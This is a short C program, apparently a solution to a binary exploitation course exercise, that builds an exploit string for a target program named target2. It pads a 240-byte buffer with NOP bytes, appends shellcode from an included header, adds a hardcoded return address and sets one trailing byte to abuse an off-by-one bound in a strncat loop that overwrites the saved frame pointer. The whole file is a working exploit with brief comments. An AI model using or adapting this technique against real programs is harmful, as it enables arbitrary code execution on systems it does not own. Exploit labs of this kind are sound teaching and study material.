#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

/*
 * Construct your exploit string in the main function and print it.
 * You can pass it into a target binary <target> by running"<target> $(sploit)"
 * in your terminal.
 */

int main(void)
{

  /* This is a different case from the ex.1, since here in target2.c  
   * we see that a strncat is performed. However, there's a simple bug 
   * we can exploit: we're checking up to i<=len -> we've control over the last byte (RBP)
   * RET will be content of RBP + 4! 
   */

  int n = 0, address = 4;
  for (; shellcode[n] != '\0'; n++);

  int N = 240;
  char* exploit = (char*) malloc((N+1)*sizeof(char));

  for (int i=0; i<N-n-address; i++)
    exploit[i] = NOP;

  strcat(exploit, shellcode);

  char* ret_address = "\xb6\x05\x80\x40";

  strcat(exploit, ret_address);

  char last_byte = '\x08';
  exploit[N] = last_byte;

  exploit[N+1] = '\0';

  printf("%s", exploit);

  free(exploit);

  return 0;
}
